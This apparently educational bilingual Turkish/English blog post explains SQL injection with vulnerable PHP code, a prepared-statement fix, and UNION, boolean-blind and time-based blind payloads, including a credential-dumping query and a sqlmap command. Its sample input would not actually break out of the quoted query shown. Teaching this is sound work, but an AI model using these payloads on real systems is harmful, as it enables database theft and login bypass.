SQL Injection: From Basics to Advanced
Attack Analysis and Prevention

5 Nisan 2026 April 5, 2026 | Web Security | 12 dk okuma 12 min read | Dogukan Ucer
SQL Injection OWASP Web App Security Penetration Testing

SQL Injection (SQLi), bir saldırganın web uygulamasının veritabanı sorgularına kötü amaçlı SQL kodu enjekte etmesine olanak tanıyan kritik bir güvenlik açığıdır. OWASP Top 10'da yıllardır ilk sıralarda yer alır ve doğru şekilde istismar edildiğinde tüm veritabanının sızdırılmasından, kimlik doğrulama bypassına kadar geniş bir saldırı yüzeyi sunar.

⚠ Yasal Uyarı: Bu yazıdaki teknikler yalnızca eğitim, CTF ve izin verilmiş pentest senaryoları için sunulmuştur. İzinsiz sistemlere uygulanması yasalarca suçtur.

Temel Mekanizma: Ne Zaman Oluşur?

SQLi, kullanıcı girdisinin sanitize edilmeden doğrudan bir SQL sorgusuna eklenmesiyle ortaya çıkar.

PHP — Vulnerable Code 
// KULLANICI GİRDİSİ: $_GET['id'] = "1 OR 1=1--"
$id    = $_GET['id'];
$query = "SELECT * FROM users WHERE id = '$id'";
// WHERE koşulu her zaman TRUE döner → tüm kayıtlar sızdırılır
$result = mysqli_query($conn, $query);

Saldırı Tipleri

1. Klasik (In-Band) SQLi

Saldırı sonuçlarının doğrudan HTTP yanıtında görülebildiği durumlardır. UNION-based ve Error-based olarak ikiye ayrılır.

SQL — UNION-Based Payload 
-- Adım 1: Kolon sayısını belirle
ORDER BY 3--  ← hata verdiğinde kolon sayısı = 2
-- Adım 2: Veritabanı bilgisi çek
UNION SELECT database(), version()--
-- Adım 3: Kullanıcıları dök
UNION SELECT username, password FROM users--

2. Blind (Kör) SQLi

Sorgu sonucu HTTP yanıtında görünmez; ancak uygulamanın TRUE/FALSE davranışları gözlemlenerek veri çıkarılabilir.

SQL — Boolean-Based Blind 
AND SUBSTRING(database(),1,1)='m'--
-- Sayfa yüklendiyse → TRUE | Yüklenmediyse → FALSE
sqlmap -u "https://target.com/page?id=1" --dbs --batch

3. Time-Based Blind SQLi

SQL — Time-Based Blind (MySQL) 
AND IF(SUBSTRING(database(),1,1)='m', SLEEP(5), 0)--
-- Yanıt 5 saniye gecikirse → koşul TRUE

Tam Koruma: Prepared Statements

PHP — Güvenli Kod (PDO) 
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->bindParam(':id', $_GET['id'], PDO::PARAM_INT);
$stmt->execute();
🚨 Kritik: Blacklist tabanlı filtreleme hiçbir zaman yeterli değildir. Her zaman Prepared Statements kullanın.

SQL Injection (SQLi) is a critical vulnerability that allows an attacker to inject malicious SQL code into a web application's database queries. It has consistently topped the OWASP Top 10 and, when properly exploited, provides a wide attack surface — from dumping entire databases to bypassing authentication.

⚠ Legal Warning: The techniques in this article are for educational purposes, CTF challenges, and authorized penetration testing only. Using them on systems without permission is illegal.

Core Mechanism: How Does It Happen?

SQLi occurs when user input is added directly to an SQL query without sanitization.

PHP — Vulnerable Code 
// USER INPUT: $_GET['id'] = "1 OR 1=1--"
$id    = $_GET['id'];
$query = "SELECT * FROM users WHERE id = '$id'";
// WHERE always returns TRUE → all records leaked
$result = mysqli_query($conn, $query);

Attack Types

1. Classic (In-Band) SQLi

Results are visible directly in the HTTP response. Divided into UNION-based and Error-based.

SQL — UNION-Based Payload 
-- Step 1: Find column count
ORDER BY 3--  ← error means 2 columns
-- Step 2: Extract database info
UNION SELECT database(), version()--
-- Step 3: Dump users
UNION SELECT username, password FROM users--

2. Blind SQLi

No output in the response — data is inferred from TRUE/FALSE application behavior.

SQL — Boolean-Based Blind 
AND SUBSTRING(database(),1,1)='m'--
-- Page loads → TRUE | Does not load → FALSE
sqlmap -u "https://target.com/page?id=1" --dbs --batch

3. Time-Based Blind SQLi

SQL — Time-Based Blind (MySQL) 
AND IF(SUBSTRING(database(),1,1)='m', SLEEP(5), 0)--
-- 5-second delay → condition is TRUE

Full Protection: Prepared Statements

PHP — Secure Code (PDO) 
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->bindParam(':id', $_GET['id'], PDO::PARAM_INT);
$stmt->execute();
🚨 Critical: Blacklist-based filtering is never sufficient. Always use Prepared Statements.
